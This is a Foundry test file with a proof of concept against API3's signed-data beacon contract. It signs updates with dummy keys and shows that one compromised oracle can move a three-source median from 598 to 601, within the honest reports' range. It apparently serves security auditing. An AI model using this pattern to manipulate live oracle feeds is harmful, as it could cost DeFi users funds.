// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {BeaconUpdatesWithSignedData} from "../src/api3-server-v1/BeaconUpdatesWithSignedData.sol";

/// @dev Test-only read helpers; all update and aggregation logic is the
/// historical API3 source in BeaconUpdatesWithSignedData/DataFeedServer.
contract BeaconSetHarness is BeaconUpdatesWithSignedData {
    function beaconId(address airnode, bytes32 templateId) external pure returns (bytes32) {
        return deriveBeaconId(airnode, templateId);
    }

    function read(bytes32 dataFeedId) external view returns (int224 value, uint32 timestamp) {
        return _readDataFeedWithId(dataFeedId);
    }
}

contract PoC_17624 is Test {
    uint256 private constant AIRNODE_0_PK = 0x101;
    uint256 private constant AIRNODE_1_PK = 0x202;
    uint256 private constant AIRNODE_2_PK = 0x303;

    BeaconSetHarness private server;
    address private airnode0;
    address private airnode1;
    address private airnode2;
    bytes32 private template0 = bytes32(uint256(0x10));
    bytes32 private template1 = bytes32(uint256(0x11));
    bytes32 private template2 = bytes32(uint256(0x12));

    function setUp() public {
        server = new BeaconSetHarness();
        airnode0 = vm.addr(AIRNODE_0_PK);
        airnode1 = vm.addr(AIRNODE_1_PK);
        airnode2 = vm.addr(AIRNODE_2_PK);
    }

    function _update(
        uint256 privateKey,
        address airnode,
        bytes32 templateId,
        uint256 timestamp,
        int256 value
    ) private {
        bytes memory data = abi.encode(value);
        bytes32 unsignedHash = keccak256(abi.encodePacked(templateId, timestamp, data));
        bytes32 signedHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", unsignedHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, signedHash);
        server.updateBeaconWithSignedData(
            airnode,
            templateId,
            timestamp,
            data,
            abi.encodePacked(r, s, v)
        );
    }

    function test_one_compromised_oracle_moves_exact_dapi_median() public {
        uint256 timestamp = block.timestamp;
        bytes32 id0 = server.beaconId(airnode0, template0);
        bytes32 id1 = server.beaconId(airnode1, template1);
        bytes32 id2 = server.beaconId(airnode2, template2);

        // Two honest Airnodes report 603 and 598. The compromised third
        // Airnode initially reports the lower endpoint, so the exact
        // DataFeedServer aggregation returns 598.
        _update(AIRNODE_0_PK, airnode0, template0, timestamp, 603);
        _update(AIRNODE_1_PK, airnode1, template1, timestamp, 598);
        _update(AIRNODE_2_PK, airnode2, template2, timestamp, 598);

        bytes32[] memory beaconIds = new bytes32[](3);
        beaconIds[0] = id0;
        beaconIds[1] = id1;
        beaconIds[2] = id2;
        bytes32 beaconSetId = server.updateBeaconSetWithBeacons(beaconIds);
        (int224 initialMedian, ) = server.read(beaconSetId);
        assertEq(initialMedian, 598);

        // Only the compromised signed report changes. The real
        // updateBeaconWithSignedData -> processBeaconUpdate -> median path
        // now returns a value selected strictly inside the honest interval.
        _update(AIRNODE_2_PK, airnode2, template2, timestamp + 1, 601);
        server.updateBeaconSetWithBeacons(beaconIds);
        (int224 manipulatedMedian, ) = server.read(beaconSetId);
        assertEq(manipulatedMedian, 601);
        assertEq(uint256(int256(manipulatedMedian - initialMedian)), 3);
    }
}
